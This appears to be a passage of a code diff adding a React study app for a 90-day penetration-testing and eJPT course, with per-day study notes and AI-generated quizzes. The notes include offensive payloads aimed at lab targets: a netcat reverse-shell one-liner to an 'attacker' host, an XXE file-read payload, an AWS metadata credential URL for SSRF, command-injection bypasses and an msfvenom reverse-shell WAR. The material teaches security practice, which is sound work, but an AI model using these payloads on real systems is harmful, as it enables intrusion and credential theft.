+    study:["SSRF: server makes HTTP request to attacker-controlled URL — can reach internal services","Test: replace URL parameter with http://127.0.0.1/ or http://localhost/ — does it return content?","AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ — gets IAM credentials","Internal port scan via SSRF: try http://127.0.0.1:PORT for ports 22, 80, 443, 8080, 3306","Blind SSRF: no output — use Burp Collaborator or interactsh to detect out-of-band connections"],
+    resource:"PortSwigger: SSRF labs", resourceUrl:"https://portswigger.net/web-security/ssrf" },
+  { day:55, title:"XXE Injection", topic:"XXE injection – entities, blind XXE", phase:2,
+    study:["XXE targets XML parsers — inject XML external entity to read local files or make SSRF requests","Basic payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> then reference &xxe;","Upload XML: intercept file upload in Burp, change content to XML with entity — then submit","Blind XXE: exfiltrate via external DTD or DNS — use Burp Collaborator for detection","Mitigation: disable external entity processing in XML parser config — developers often forget"],
+    resource:"PortSwigger: XXE labs", resourceUrl:"https://portswigger.net/web-security/xxe" },
+  { day:56, title:"Command Injection", topic:"Command injection – OS command injection, bypass techniques", phase:2,
+    study:["Command injection: user input passed to OS command without sanitization — ; | && || add commands","Test: ;id, |id, $(id), `id` — if you see uid= in response you have command injection","Blind: no output — use sleep 5 to test time delay, or ping your machine to confirm execution","Bypass filters: use ${IFS} instead of spaces, base64 encode payload, use alternative command separators","Reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444>/tmp/f"],
+    resource:"PortSwigger: Command injection labs", resourceUrl:"https://portswigger.net/web-security/os-command-injection" },
+  { day:57, title:"Deserialization", topic:"Insecure deserialization – concepts and impact", phase:2,
+    study:["Serialization: converting objects to bytes for storage/transmission. Deserialization: reverse","Insecure deserialization: app deserializes attacker-controlled data — can lead to RCE","PHP: unserialize() with magic methods __wakeup, __destruct — check source for these","Java: ysoserial tool generates payloads for common Java deserialization gadget chains","Check for base64 blobs in cookies/params — Java serialized objects start with 'rO0AB'"],
+    resource:"PortSwigger: Deserialization intro", resourceUrl:"https://portswigger.net/web-security/deserialization" },
+  { day:58, title:"Logic Flaws", topic:"Business logic flaws – what scanners miss", phase:2,
+    study:["Logic flaws: the app works as designed but the design is flawed — scanners can't find these","Price manipulation: add negative quantity, change hidden price field, apply discount multiple times","Workflow bypass: skip steps in multi-stage process by going directly to the final URL","Privilege escalation: change role=user to role=admin in request body or cookie","Race conditions: send parallel requests — can bypass one-time-use codes or double spending"],
+    resource:"PortSwigger: Business logic labs", resourceUrl:"https://portswigger.net/web-security/logic-flaws" },
+  { day:59, title:"Burp Advanced", topic:"Burp Suite advanced – intruder, scanner, extensions", phase:2,
+    study:["Intruder: automate modified requests — Sniper (one position), Cluster Bomb (multiple payloads)","Intruder use cases: brute force login, fuzz parameters, enumerate IDs, test all SQLi payloads","Active Scanner (Pro): automatically crawls and tests for vulnerabilities — review findings manually","Extensions: add SQLiPy, J2EEScan, Logger++ from BApp Store to enhance Burp's capabilities","Burp macros: record sequences of requests (login flow) to maintain session during active scanning"],
+    resource:"TryHackMe: Burp Suite Repeater/Intruder", resourceUrl:"https://tryhackme.com/room/burpsuiteintruder" },
+  { day:60, title:"Phase 2 Review", topic:"Phase 2 review – exploitation, web attacks, privesc", phase:2,
+    study:["Can you run a full Metasploit attack: scan → search → configure → exploit → post-exploit?","Web attacks: test SQLi, XSS, IDOR, SSRF manually in Burp without referring to notes","PrivEsc: from a low-priv shell, can you find at least 3 privesc vectors on Linux and Windows?","Do one full machine on TryHackMe from scratch — no walkthroughs until you've tried for 30 min","Build your personal cheat sheet — commands you use most should be written down for quick reference"],
+    resource:"Build a personal cheat sheet on GitHub", resourceUrl:"https://github.com" },
+  { day:61, title:"eJPT Overview", topic:"eJPT exam format – what's tested, lab environment", phase:3,
+    study:["eJPT is a 100% practical exam — live network lab, no multiple choice","72 hours to compromise hosts and answer questions about what you find","Tests: host discovery, service enumeration, web attacks, exploitation, pivoting","Tools allowed: any tool you want — Nmap, MSF, Burp, sqlmap, gobuster, etc.","INE's free Starter Pass gives access to all eJPT learning materials and practice labs"],
+    resource:"INE: eJPT course (free)", resourceUrl:"https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-cert" },
+  { day:62, title:"Host Discovery", topic:"Host discovery – ping sweep, ARP scan techniques", phase:3,
+    study:["nmap -sn 10.10.10.0/24 — ping sweep to find live hosts on a network","netdiscover -r 192.168.1.0/24 — ARP-based discovery, works even when ICMP is blocked","arp-scan -l — scans local network using ARP, very fast and reliable on LAN","fping -ag 10.10.10.0/24 — fast ping sweep with alive host summary","In eJPT exam: start by discovering all hosts in the given subnet before doing anything else"],
+    resource:"INE eJPT: Assessment Methodologies", resourceUrl:"https://ine.com" },
+  { day:63, title:"Service Enumeration", topic:"Service enumeration full workflow – nmap NSE scripts", phase:3,
+    study:["nmap -sC -sV -p- -oA full_scan target — comprehensive scan saved to all formats","NSE scripts: nmap --script=smb-enum-shares,smb-enum-users target — targeted enumeration","nmap --script=http-title,http-headers target — web server fingerprinting","vuln category: nmap --script=vuln target — checks for known vulnerabilities","Banner grabbing: nc target port — some services announce their version in the first response"],
+    resource:"INE eJPT: Host & Network Penetration", resourceUrl:"https://ine.com" },
+  { day:64, title:"CVE Research", topic:"Exploitation workflow – research CVEs, pick exploits", phase:3,
+    study:["Service found → google 'ServiceName version exploit' or search CVE databases","searchsploit servicename — searches local Exploit-DB copy for matching exploits","Read exploit code before running — understand what it does, modify IPs/ports","CVE details: nvd.nist.gov has full vulnerability details including CVSS scores","Exploit-DB (exploit-db.com) has downloadable PoC code for thousands of CVEs"],
+    resource:"Exploit-DB walkthrough + practice", resourceUrl:"https://www.exploit-db.com" },
+  { day:65, title:"Web Attacks Exam", topic:"Web app attacks in exam context – SQLi, XSS, dirbusting", phase:3,
+    study:["eJPT web testing: always run gobuster/ffuf first to find hidden pages and directories","Check every input field for SQLi — even search boxes, login forms, URL parameters","Use sqlmap for confirmed SQLi: extract databases, tables, dump credentials","XSS in eJPT: look for reflected inputs, test with [script]alert(1)[/script]","Credentials found in web app often reused on SSH, FTP, or other services — always try them"],
+    resource:"INE eJPT: Web App section", resourceUrl:"https://ine.com" },
+  { day:66, title:"Pivoting", topic:"Pivoting & routing – adding routes in MSF, proxychains", phase:3,
+    study:["Pivot = use compromised host to attack hosts only accessible from that machine's network","MSF routing: run post/multi/manage/autoroute in meterpreter session → adds internal routes","After routing: use MSF auxiliary scanners to scan the internal network through the pivot","Socks proxy: use auxiliary/server/socks_proxy then proxychains for non-MSF tools","In eJPT: if you find a dual-homed host (two IPs), it's your pivot point to the next subnet"],
+    resource:"INE eJPT: Pivoting module", resourceUrl:"https://ine.com" },
+  { day:67, title:"Full Lab Practice", topic:"Full eJPT-style lab practice end-to-end", phase:3,
+    study:["Run a complete attack on an INE lab or TryHackMe network from zero to root","Document every command, output, and finding as if writing a real pentest report","Time yourself — eJPT gives 72 hours but practice completing a box in under 2 hours","If stuck: enumerate more. Most 'I can't find anything' situations = incomplete enumeration","Review the INE student success page for exam tips from people who have passed"],
+    resource:"INE labs / TryHackMe Jr Pentester path", resourceUrl:"https://tryhackme.com/path/outline/jrpenetrationtester" },
+  { day:68, title:"CTF Methodology", topic:"CTF methodology – how to approach unknown challenges", phase:3,
+    study:["CTF categories: web, pwn (binary), rev (reversing), crypto, forensics, OSINT, misc","First step: enumerate everything visible — read all text, check all links, view page source","Don't guess — CTFs are logic puzzles. If stuck, enumerate more or look for hints in challenge name","Tools by category: web=Burp, pwn=pwndbg/pwntools, rev=Ghidra, crypto=CyberChef, forensics=Autopsy","After solving: read other writeups to see approaches you didn't think of — learning from CTFs is key"],
+    resource:"YouTube: John Hammond CTF walkthroughs", resourceUrl:"https://youtube.com/@_JohnHammond" },
+  { day:69, title:"Steganography", topic:"Steganography & forensics basics for CTF", phase:3,
+    study:["Steganography: hiding data inside images, audio, or other files — common CTF technique","steghide extract -sf image.jpg — extract hidden data (might need a passphrase)","strings file.jpg | grep flag — look for plaintext flags hidden in binary files","exiftool image.jpg — check metadata for hidden information in EXIF fields","binwalk -e file — extract embedded files from within another file (files within files)"],
+    resource:"TryHackMe: CC Steganography", resourceUrl:"https://tryhackme.com" },
+  { day:70, title:"Crypto for CTF", topic:"Crypto for CTFs – base64, Caesar, XOR, RSA basics", phase:3,
+    study:["Base64: echo 'dGVzdA==' | base64 -d decodes. Recognizable by = padding at end","Caesar cipher: shift each letter by N — CyberChef ROT13 covers the most common variant","XOR: if key is known, XOR again to decrypt — XOR with same key twice gives original","RSA: public key crypto — if N is small or e is wrong, RSA can be broken with tools like RsaCtfTool","CyberChef (gchq.github.io/CyberChef) — browser-based tool for encoding/decoding everything"],
+    resource:"TryHackMe: Crack the Hash", resourceUrl:"https://tryhackme.com/room/crackthehash" },
+  { day:71, title:"Reverse Engineering", topic:"Reverse engineering intro – strings, ltrace, strace, Ghidra", phase:3,
+    study:["strings binary — extracts all printable strings, often reveals hardcoded flags or paths","file binary — identifies file type (ELF, PE, script) before you start reversing","ltrace ./binary — traces library calls (strcmp, system) in real time — often reveals password checks","strace ./binary — traces system calls — shows file opens, network connections, etc.","Ghidra: open binary → analyze → find main() → read decompiled C code to understand program logic"],
+    resource:"TryHackMe: Intro to x86-64", resourceUrl:"https://tryhackme.com/room/introtox8664" },
+  { day:72, title:"Buffer Overflow", topic:"Binary exploitation intro – buffer overflow concept", phase:3,
+    study:["Buffer overflow: write more data than a buffer can hold → overwrite adjacent memory","Stack layout: local vars → saved EBP → return address (EIP) — overwrite EIP to control execution","Find offset: use pattern_create (msf-pattern_create -l 200) then pattern_offset with EIP value","Badchars: test which bytes crash the exploit — avoid them in your shellcode","TryHackMe Buffer Overflow Prep room gives a vulnerable Windows app to practice on step by step"],
+    resource:"TryHackMe: Buffer Overflow Prep", resourceUrl:"https://tryhackme.com/room/bufferoverflowprep" },
+  { day:73, title:"Real CTF", topic:"Real CTF – HackTheBox Starting Point or PicoCTF", phase:3,
+    study:["HackTheBox Starting Point Tier 0: guided machines designed for beginners — read the questions","PicoCTF: beginner-friendly CTF with hints available — great for first CTF experience","Approach: read the challenge, enumerate, form a hypothesis, test it — don't jump to tools immediately","When stuck > 30 min: look at the first hint only, try again, then second hint if needed","Keep notes as you go — your solution might help you in future challenges or real pentests"],
+    resource:"HackTheBox: Starting Point Tier 0", resourceUrl:"https://app.hackthebox.com/starting-point" },
+  { day:74, title:"CTF Writeup", topic:"Write your first CTF writeup – structure and documentation", phase:3,
+    study:["Writeup structure: challenge description → initial enumeration → finding the vulnerability → exploit → flag","Be specific about commands used and why — 'I ran nmap because I needed to find open ports'","Include screenshots or command output — makes the writeup credible and useful to others","Publish on Medium, GitHub, or a personal blog — recruiters look for this kind of content","Writing forces you to fully understand what you did — if you can't explain it, you don't understand it"],
+    resource:"Medium.com – publish your writeup", resourceUrl:"https://medium.com" },
+  { day:75, title:"HTB: Lame", topic:"HTB Machine: Lame – classic beginner Linux box", phase:3,
+    study:["Lame is one of the oldest HTB machines — runs vulnerable Samba 3.0.20","Exploit: Samba usermap_script CVE-2007-2447 — command injection via username field","MSF module: exploit/multi/samba/usermap_script — one of the simplest MSF exploits","After shell: you land as root immediately — check /root/root.txt and /home/*/user.txt","Lesson: old versions of services = easy wins. Always check service versions against CVE databases"],
+    resource:"HackTheBox: Lame", resourceUrl:"https://app.hackthebox.com" },
+  { day:76, title:"HTB: Legacy", topic:"HTB Machine: Legacy – Windows SMB exploit", phase:3,
+    study:["Legacy runs Windows XP with unpatched SMB — vulnerable to MS08-067 and MS17-010","MS08-067: exploit/windows/smb/ms08_067_netapi — classic XP/2003 exploit","Lands as SYSTEM immediately — grab both flags from C:\\Documents and Settings","Manual alternative: download exploit from Exploit-DB, install impacket, run with python2","Lesson: Windows XP/2003 in scope = instant SYSTEM via SMB most of the time"],
+    resource:"HackTheBox: Legacy", resourceUrl:"https://app.hackthebox.com" },
+  { day:77, title:"HTB: Jerry", topic:"HTB Machine: Jerry – Tomcat web exploitation", phase:3,
+    study:["Jerry runs Apache Tomcat with default credentials admin:s3cret on /manager/html","Upload a WAR file reverse shell: msfvenom -p java/jsp_shell_reverse_tcp -f war > shell.war","Deploy WAR via Tomcat manager, then curl the deployed path to trigger it","Meterpreter session as SYSTEM — both flags are in a single file on the Desktop","Lesson: always try default credentials on admin panels before attempting anything complex"],
+    resource:"HackTheBox: Jerry", resourceUrl:"https://app.hackthebox.com" },
+  { day:78, title:"THM: Pickle Rick", topic:"THM: Pickle Rick – web + Linux beginner machine", phase:3,
+    study:["Source code of webpage contains a username — always view-source on web challenges","robots.txt contains a password — check this file on every web target, always","Command injection in a 'command panel' — try ls, cat, and then reverse shell","Some commands are blocked — use alternatives: less, python3 -c 'import os;os.system(\"id\")'","Third ingredient requires sudo — run sudo -l to check sudo permissions first"],
+    resource:"TryHackMe: Pickle Rick", resourceUrl:"https://tryhackme.com/room/picklerick" },
+  { day:79, title:"THM: Relevant", topic:"THM: Relevant – Windows web + privesc", phase:3,
+    study:["Nmap reveals IIS web server and SMB — enumerate both simultaneously","SMB anonymous access allows listing shares — find interesting files and credentials","IIS might run ASP or ASPX — upload a web shell if you find a writable directory","SeImpersonatePrivilege visible via whoami /priv — use PrintSpoofer.exe to get SYSTEM","Lesson: Windows web servers running IIS often pair with SMB — enumerate both attack surfaces"],
+    resource:"TryHackMe: Relevant", resourceUrl:"https://tryhackme.com/room/relevant" },
+  { day:80, title:"THM: Vulnversity", topic:"THM: Vulnversity – full recon to root workflow", phase:3,
+    study:["Classic beginner box: Nmap → web enumeration → file upload bypass → reverse shell → privesc","File upload filter bypass: change extension from .php to .phtml — bypasses basic extension filters","Upload PHP reverse shell (pentestmonkey), set up listener, trigger the shell via browser","Found SUID binary: /bin/systemctl — abused via GTFOBins to escalate to root","Lesson: full attack chain in one box — great for practicing the complete methodology"],
+    resource:"TryHackMe: Vulnversity", resourceUrl:"https://tryhackme.com/room/vulnversity" },
+  { day:81, title:"Machine Review", topic:"Machine review – IppSec method, gap analysis", phase:3,
+    study:["After every machine: watch IppSec's video for the same box — note what you missed","IppSec shows alternative approaches, faster methods, and deep dives into why exploits work","Gap analysis: list everything you didn't know or had to look up — those are your weak areas","Re-attempt machines you failed without any notes or hints — tests real retention","IppSec's channel has 400+ walkthroughs — searching by technique (e.g. 'IppSec SSRF') works great"],
+    resource:"IppSec YouTube walkthroughs", resourceUrl:"https://youtube.com/@ippsec" },
+  { day:82, title:"Phase 1 Revision", topic:"Revise Phase 1 – networking, Linux, OSINT", phase:3,
+    study:["Quiz yourself: what port is SMB? DNS? RDP? MySQL? — no looking it up","Draw the OSI model from memory and give one attack per relevant layer","Networking commands: run ifconfig, ss -tulpn, arp -a and explain each output","OSINT: perform a full passive recon on a practice domain using only free tools","Linux: from a new terminal, find all SUID binaries and world-writable directories — time yourself"],
+    resource:"Your personal notes and cheat sheet", resourceUrl:"https://github.com" },
+  { day:83, title:"Phase 2 Revision", topic:"Revise Phase 2 – exploitation, web, privesc", phase:3,
+    study:["Metasploit: set up a complete attack from scratch without looking at notes","Web: in Burp Suite, manually test for SQLi, XSS, and IDOR on a practice target","PrivEsc: given a low-priv shell, complete privesc without running LinPEAS — manual only","Password cracking: crack a set of MD5, NTLM, and bcrypt hashes using hashcat","Review your weakest quiz scores — spend extra time on topics where you scored below 7/10"],
+    resource:"Your personal notes and cheat sheet", resourceUrl:"https://github.com" },
+  { day:84, title:"Practice Exam", topic:"INE eJPT practice exam under timed conditions", phase:3,
+    study:["Take the INE practice assessment with a 4-hour time limit — simulate real exam pressure","Don't use notes for the first attempt — identify gaps from what you couldn't answer","eJPT questions: 'What is the IP of the domain controller?' 'What is the web server version?'","Enumeration is 80% of the exam — thorough scanning beats trying random exploits","After the practice exam: review every question you got wrong and study that topic for 30 min"],
+    resource:"INE: eJPT practice assessment", resourceUrl:"https://ine.com" },
+  { day:85, title:"Weak Area Focus", topic:"Weak area targeting from mock exam results", phase:3,
+    study:["Identify the 3 topics you scored lowest on in yesterday's practice exam","Spend the full hour drilling those specific topics with targeted labs","TryHackMe has individual rooms for almost every topic — find the specific room and complete it","Don't waste time on topics you know well — focus where the gaps are","Re-take yesterday's practice exam or a similar one after your revision session"],
+    resource:"Revisit weak TryHackMe rooms", resourceUrl:"https://tryhackme.com" },
+  { day:86, title:"GitHub Profile", topic:"GitHub profile – upload scripts, notes, writeups", phase:3,
+    study:["Create repos: 'pentest-cheatsheet', 'ctf-writeups', 'bash-scripts', 'learning-notes'","README files in each repo make them look professional — write a brief description","Pin your best repos to your GitHub profile so they're visible immediately","Custom scripts you wrote (bash port scanner from Day 14) belong here — shows practical skills","GitHub green squares (contributions) are visible to recruiters — stay active"],
+    resource:"GitHub profile cleanup", resourceUrl:"https://github.com" },
+  { day:87, title:"LinkedIn Update", topic:"LinkedIn update – TryHackMe rank, skills, projects", phase:3,
+    study:["Add TryHackMe profile link and your current rank/points to LinkedIn About section","Skills to add: Penetration Testing, Nmap, Metasploit, Burp Suite, Linux, Wireshark, Python","Projects section: add your GitHub repos as projects with descriptions of what you built/learned","Connect with Indian cybersecurity professionals — comment on their posts to get visibility","Search 'cybersecurity intern India' on LinkedIn and apply — you now have relevant skills and projects"],
+    resource:"LinkedIn profile update", resourceUrl:"https://linkedin.com" },
+  { day:88, title:"Final Machine", topic:"Final blind machine – unseen box, no hints", phase:3,
+    study:["Pick a machine you haven't done before — HTB easy or THM beginner rated","No walkthroughs, no hints, no Google for 60 minutes — simulate exam conditions","Document every command in a text file as you go — practice real reporting discipline","If you root it: great. If you don't: review what you tried and what the blocker was","This is your final skills check before the eJPT — be honest about what you could and couldn't do"],
+    resource:"HTB or THM: fresh box, your choice", resourceUrl:"https://app.hackthebox.com" },
+  { day:89, title:"90 Day Review", topic:"90 day review – what changed, knowledge gaps identified", phase:3,
+    study:["Write down 10 things you can do now that you couldn't do on Day 1 — appreciate the progress","Identify 3 remaining knowledge gaps — these become your Phase 4 focus (OSCP prep)","Review your overall quiz score — which phase was weakest? That tells you what to revise more","Update your resume: add eJPT (if booked/passed), TryHackMe rank, GitHub, projects","Plan the next 90 days: OSCP prep starts with Active Directory, Buffer Overflow, and more advanced privesc"],
+    resource:"Journal your journey and plan next steps", resourceUrl:"https://github.com" },
+  { day:90, title:"Book eJPT", topic:"Book the eJPT exam – you're ready", phase:3,
+    study:["Go to ine.com, purchase the eJPT voucher — it's around $200 USD but watch for sales","You get 72 hours to complete the exam once you start — plan your schedule","Start the exam with a full Nmap scan of the entire provided subnet","Read all the questions first — they guide you on what to find in the lab","You've put in 90 hours of study. Trust your preparation. Start the exam and go get it."],
+    resource:"INE Security: book eJPT exam", resourceUrl:"https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-cert" },
+];
+
+const PHASE_COLORS = {1:"#00ff9f", 2:"#ff6b35", 3:"#a855f7"};
+const PHASE_NAMES  = {1:"Foundations", 2:"Core Pentesting", 3:"eJPT Prep & CTF"};
+const KEY = "cyber90_v3";
+
+function load() { try { return JSON.parse(localStorage.getItem(KEY)||"{}"); } catch { return {}; } }
+function save(d) { try { localStorage.setItem(KEY, JSON.stringify(d)); } catch {} }
+
+function computeStreak(scores) {
+  const days = Object.keys(scores).map(Number).sort((a,b)=>b-a);
+  if (!days.length) return 0;
+  let streak=0, expected=days[0];
+  for (const d of days) { if(d===expected){streak++;expected--;} else break; }
+  return streak;
+}
+
+// ─── QUIZ SCREEN ──────────────────────────────────────────────────────────────
+function QuizScreen({ day, onBack, onComplete }) {
+  const [qs, setQs] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState(null);
+  const [idx, setIdx] = useState(0);
+  const [sel, setSel] = useState(null);
+  const [answers, setAnswers] = useState([]);
+  const [done, setDone] = useState(false);
+  const color = PHASE_COLORS[day.phase];
+
+  useEffect(() => { fetchQuiz(); }, []);
+
+  async function fetchQuiz() {
+    setLoading(true); setError(null); setQs([]); setIdx(0); setSel(null); setAnswers([]); setDone(false);
+    try {
+      const res = await fetch("https://api.anthropic.com/v1/messages", {
+        method:"POST", headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({
+          model:"claude-sonnet-4-6", max_tokens:2000,
+          messages:[{role:"user", content:
+`Generate exactly 10 multiple choice questions for a cybersecurity student on the topic: "${day.topic}".
+Return ONLY a raw JSON array with no markdown, no backticks, no explanation:
+[{"q":"question text","options":["A) ...","B) ...","C) ...","D) ..."],"answer":0,"explanation":"why this is correct"}]
+Rules: "answer" is 0-based index. Mix easy and hard questions. Make them practical and relevant to eJPT/OSCP level pentesting.`
+          }]
+        })
+      });
+      const data = await res.json();
+      const text = data.content?.map(c=>c.text||"").join("")||"";
+      setQs(JSON.parse(text.replace(/```json|```/g,"").trim()));
+    } catch { setError("Failed to load questions. Check your connection and retry."); }
+    finally { setLoading(false); }
+  }
+
+  function handleAnswer(i) {
+    if (sel!==null) return;
+    setSel(i);
+    setAnswers(prev=>[...prev,{sel:i, correct:qs[idx].answer, ok:i===qs[idx].answer}]);
+  }
+
+  function next() {
+    if (idx+1>=qs.length) {
+      const finalAnswers=[...answers];
+      onComplete(finalAnswers.filter(a=>a.ok).length);
+      setDone(true);
+    } else { setIdx(i=>i+1); setSel(null); }
+  }
+
+  const score = answers.filter(a=>a.ok).length;
+
+  return (
+    <div style={{background:"#08090f",minHeight:"100vh",color:"#e2e8f0",fontFamily:"system-ui,sans-serif",maxWidth:480,margin:"0 auto",display:"flex",flexDirection:"column"}}>
+      <div style={{padding:"16px 20px",borderBottom:"1px solid #1a1a2e",display:"flex",alignItems:"center",gap:12,flexShrink:0}}>
+        <button onClick={onBack} style={{background:"transparent",border:"none",color:"#475569",fontSize:20,cursor:"pointer",padding:0,lineHeight:1}}>←</button>
+        <div style={{flex:1}}>
+          <div style={{fontSize:10,color:color,letterSpacing:"0.12em",marginBottom:2}}>DAY {day.day} · QUIZ</div>
+          <div style={{fontSize:13,fontWeight:600,color:"#94a3b8",lineHeight:1.3}}>{day.title}</div>
+        </div>
+        {!done && !loading && qs.length>0 && <div style={{fontSize:11,color:color,fontWeight:700}}>{score}/{answers.length}</div>}
+      </div>
+
+      <div style={{flex:1,padding:20,overflowY:"auto"}}>
+        {loading && (
+          <div style={{textAlign:"center",paddingTop:80}}>
+            <div style={{fontSize:36,marginBottom:14}}>⚡</div>
+            <div style={{color:color,fontSize:14,fontWeight:700}}>Generating 10 questions...</div>
+            <div style={{color:"#334155",fontSize:12,marginTop:6}}>AI is crafting your quiz on {day.title}</div>
+          </div>
+        )}
+
+        {error && (
+          <div style={{textAlign:"center",paddingTop:60}}>
+            <div style={{color:"#ff4d6d",fontSize:13,marginBottom:16}}>{error}</div>
+            <button onClick={fetchQuiz} style={{background:"#ff4d6d",color:"#fff",border:"none",borderRadius:8,padding:"10px 24px",cursor:"pointer",fontWeight:700,fontFamily:"inherit"}}>Retry</button>
+          </div>
+        )}
+
+        {!loading && !error && !done && qs.length>0 && (
+          <>
+            <div style={{display:"flex",justifyContent:"space-between",fontSize:11,color:"#475569",marginBottom:8}}>
+              <span>Question {idx+1} of {qs.length}</span>
+              <span style={{color}}>✓ {score} correct</span>
+            </div>
+            <div style={{background:"#1a1a2e",borderRadius:4,height:4,marginBottom:20,overflow:"hidden"}}>
+              <div style={{height:"100%",width:`${(idx/qs.length)*100}%`,background:color,borderRadius:4,transition:"width 0.3s"}}/>
+            </div>
+
+            <div style={{background:"#0f1019",border:"1px solid #1a1a2e",borderRadius:12,padding:16,marginBottom:16}}>
+              <div style={{fontSize:15,fontWeight:600,color:"#f1f5f9",lineHeight:1.6}}>{qs[idx].q}</div>
+            </div>
+
+            <div style={{display:"flex",flexDirection:"column",gap:10,marginBottom:16}}>
+              {qs[idx].options.map((opt,i)=>{
+                const isC=i===qs[idx].answer, isSel=i===sel;
+                let bc="#1a1a2e",bg="#0f1019",tc="#cbd5e1";
+                if(sel!==null){
+                  if(isC){bc="#00ff9f";bg="#00ff9f12";tc="#00ff9f";}
+                  else if(isSel){bc="#ff4d6d";bg="#ff4d6d12";tc="#ff4d6d";}
+                }
+                return (
+                  <button key={i} onClick={()=>handleAnswer(i)} style={{background:bg,border:`1px solid ${bc}`,borderRadius:10,padding:"13px 16px",textAlign:"left",cursor:sel!==null?"default":"pointer",color:tc,fontSize:14,fontFamily:"inherit",lineHeight:1.4,transition:"all 0.15s"}}>{opt}</button>
+                );
+              })}
+            </div>
+
+            {sel!==null && (
+              <>
+                <div style={{background:sel===qs[idx].answer?"#00ff9f0e":"#ff4d6d0e",border:`1px solid ${sel===qs[idx].answer?"#00ff9f25":"#ff4d6d25"}`,borderRadius:10,padding:14,marginBottom:14,fontSize:13,color:"#94a3b8",lineHeight:1.6}}>
+                  <span style={{fontWeight:700,color:sel===qs[idx].answer?"#00ff9f":"#ff4d6d"}}>{sel===qs[idx].answer?"✓ Correct! ":"✗ Wrong. "}</span>
+                  {qs[idx].explanation}
+                </div>
+                <button onClick={next} style={{width:"100%",background:color,color:"#000",border:"none",borderRadius:10,padding:14,fontSize:14,fontWeight:800,cursor:"pointer",fontFamily:"inherit"}}>
+                  {idx+1>=qs.length?"See Results →":"Next →"}
+                </button>
+              </>
+            )}
+          </>
+        )}
+
+        {done && (
+          <div style={{textAlign:"center",paddingTop:10}}>
+            <div style={{fontSize:52,marginBottom:10}}>{score>=9?"🏆":score>=7?"🎯":score>=5?"⚡":"📚"}</div>
+            <div style={{fontSize:10,color:"#475569",letterSpacing:"0.14em",marginBottom:8}}>DAY {day.day} COMPLETE</div>
+            <div style={{fontSize:60,fontWeight:800,color,letterSpacing:"-3px",lineHeight:1,marginBottom:6}}>{score}/10</div>
+            <div style={{fontSize:13,color:"#64748b",marginBottom:20}}>
+              {score===10?"Perfect score! 🔥":score>=8?"Excellent work.":score>=6?"Solid — review the misses.":score>=4?"Study this topic again.":"Go back and re-read the material."}
+            </div>
+
+            <div style={{textAlign:"left",marginBottom:24}}>
+              <div style={{fontSize:10,color:"#334155",letterSpacing:"0.1em",marginBottom:10}}>BREAKDOWN</div>
+              {answers.map((a,i)=>(
+                <div key={i} style={{display:"flex",gap:10,padding:"10px 0",borderBottom:"1px solid #13131f"}}>
+                  <span style={{color:a.ok?"#00ff9f":"#ff4d6d",fontSize:14,minWidth:14,marginTop:1}}>{a.ok?"✓":"✗"}</span>
+                  <div style={{fontSize:12,color:"#475569",lineHeight:1.5,flex:1}}>
+                    <div style={{color:"#6b7280",marginBottom:a.ok?0:4}}>{qs[i]?.q}</div>
+                    {!a.ok&&<div style={{color:"#00ff9f"}}>→ {qs[i]?.options[a.correct]}</div>}
+                  </div>
+                </div>
+              ))}
+            </div>
+
+            <div style={{display:"flex",gap:10}}>
+              <button onClick={fetchQuiz} style={{flex:1,background:"#0f1019",border:"1px solid #1a1a2e",color:"#94a3b8",borderRadius:10,padding:13,fontSize:13,fontWeight:600,cursor:"pointer",fontFamily:"inherit"}}>↩ Redo</button>
+              <button onClick={onBack} style={{flex:1,background:color,color:"#000",border:"none",borderRadius:10,padding:13,fontSize:13,fontWeight:800,cursor:"pointer",fontFamily:"inherit"}}>← Back</button>
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ─── DAY DETAIL SCREEN ────────────────────────────────────────────────────────
+function DayDetail({ day, score, onBack, onQuiz }) {
+  const color = PHASE_COLORS[day.phase];
+  return (
+    <div style={{background:"#08090f",minHeight:"100vh",color:"#e2e8f0",fontFamily:"system-ui,sans-serif",maxWidth:480,margin:"0 auto"}}>
+      <div style={{padding:"16px 20px",borderBottom:"1px solid #1a1a2e",display:"flex",alignItems:"center",gap:12}}>
+        <button onClick={onBack} style={{background:"transparent",border:"none",color:"#475569",fontSize:20,cursor:"pointer",padding:0}}>←</button>
+        <div style={{flex:1}}>
+          <div style={{fontSize:10,color:color,letterSpacing:"0.12em",marginBottom:2}}>DAY {day.day} · PHASE {day.phase}</div>
+          <div style={{fontSize:16,fontWeight:800,color:"#f1f5f9"}}>{day.title}</div>
+        </div>
+        {score!==undefined && <div style={{background:color+"20",border:`1px solid ${color}40`,borderRadius:8,padding:"4px 10px",fontSize:12,color,fontWeight:700}}>{score}/10</div>}
+      </div>
+
+      <div style={{padding:"20px 20px 32px",overflowY:"auto"}}>
+        <div style={{fontSize:13,color:"#64748b",lineHeight:1.6,marginBottom:20}}>{day.topic}</div>
+
+        {/* Study Guide */}
+        <div style={{marginBottom:20}}>
+          <div style={{fontSize:10,color:color,letterSpacing:"0.12em",marginBottom:12}}>TODAY'S STUDY GUIDE</div>
+          {day.study.map((point,i)=>(
+            <div key={i} style={{display:"flex",gap:12,marginBottom:14,alignItems:"flex-start"}}>
+              <div style={{width:22,height:22,borderRadius:6,background:color+"15",border:`1px solid ${color}30`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,marginTop:1}}>
+                <span style={{fontSize:11,fontWeight:800,color}}>{i+1}</span>
+              </div>
+              <div style={{fontSize:13,color:"#94a3b8",lineHeight:1.6,flex:1}}>{point}</div>
+            </div>
+          ))}
+        </div>
+
+        {/* Resource */}
+        <div style={{background:"#0f1019",border:"1px solid #1a1a2e",borderRadius:12,padding:16,marginBottom:24}}>
+          <div style={{fontSize:10,color:"#475569",letterSpacing:"0.1em",marginBottom:8}}>RESOURCE</div>
+          <div style={{fontSize:13,color:"#94a3b8",marginBottom:10}}>{day.resource}</div>
+          <a href={day.resourceUrl} target="_blank" rel="noopener noreferrer" style={{fontSize:12,color:color,textDecoration:"none",fontWeight:600}}>Open resource →</a>
+        </div>
+
+        {/* Quiz button */}
